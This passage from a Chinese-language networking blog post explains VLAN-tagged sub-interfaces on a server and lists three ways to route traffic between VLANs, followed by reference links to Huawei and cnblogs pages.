<p><strong>工作原理：</strong> 当服务器要发送一个数据包到VLAN 10的网络时，它会通过 eth0.10 发出，操作系统会自动给这个数据包打上VLAN 10的标签。交换机的Trunk端口收到后，会根据标签将数据包转发到VLAN 10。反之，当交换机发送一个带有VLAN 20标签的数据包给服务器时，只有服务器的 eth0.20 接口能接收到它。</p>
<h1 id="跨Vlan通信"><a href="#跨Vlan通信" class="headerlink" title="跨Vlan通信"></a>跨Vlan通信</h1><ul>
<li>方式一：使用三层交换机（推荐方案）</li>
<li>方式二：使用路由器（“单臂路由”）</li>
<li>方式三：使用防火墙</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/weihua2020/p/14151012.html" target="_blank" rel="noopener">realtek adapter的vlan设定</a>,by helloweifa.</li>
<li><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/VLAN.html" target="_blank" rel="noopener">什么是VLAN</a>,by huawei.</li>
<li><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E7%BB%84%E6%92%AD.html" target="_blank" rel="noopener">什么是组播？</a>,by huawei.</li>
<li><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000141427/fcc07a2e" target="_blank" rel="noopener">配置终端直连三层网关设备进行VLAN间通信示例</a>,by huawei.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
</search>
